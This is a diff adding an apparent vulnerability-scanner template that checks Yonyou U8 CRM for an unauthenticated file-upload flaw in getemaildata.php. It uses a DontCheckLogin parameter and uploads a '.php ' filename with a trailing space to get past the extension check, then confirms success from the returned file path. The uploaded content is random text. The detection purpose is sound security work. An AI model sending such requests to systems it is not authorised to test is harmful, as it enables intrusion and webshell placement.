@@ -1,0 +1,23 @@
+name: yongyou-u8-crm-getemaildata-uploadfile
+set:
+  randstr: randomLowercase(8)
+  randbody: randomLowercase(30)
+  rboundary: randomLowercase(8)
+rules:
+  - method: POST
+    path: "/ajax/getemaildata.php?DontCheckLogin=1"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+    body: "\
+      ------WebKitFormBoundary{{rboundary}}\r\n\
+      Content-Disposition: form-data; name=\"file\"; filename=\"{{randstr}}.php \"\r\n\
+      Content-Type: text/plain\r\n\
+      \r\n\
+      {{randbody}}\r\n\
+      \r\n\
+      ------WebKitFormBoundary{{rboundary}}\r\n\
+      "
+    expression: |
+      response.status == 200 && response.body.bcontains(b'"success":true') && response.body.bcontains(b'.tmp.mht"') && response.body.bcontains(b'"filePath":')
+detail:
+  author: 666
